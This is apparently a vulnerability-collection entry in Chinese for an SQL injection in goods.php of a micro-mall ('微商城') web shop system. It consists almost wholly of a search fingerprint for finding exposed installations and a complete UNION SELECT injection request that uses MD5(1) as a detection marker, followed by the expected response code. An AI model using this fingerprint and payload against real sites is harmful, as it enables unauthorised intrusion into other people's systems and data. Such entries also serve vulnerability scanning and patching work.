# 微商城系统goods.php存在SQL注入漏洞

微商城系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/Mao_Public/js/jquery-2.1.1.min.js"`
- **请求**：`GET /goods.php?id='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(IFNULL(CAST(MD5(1)+AS+NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1`
- **响应特征**：200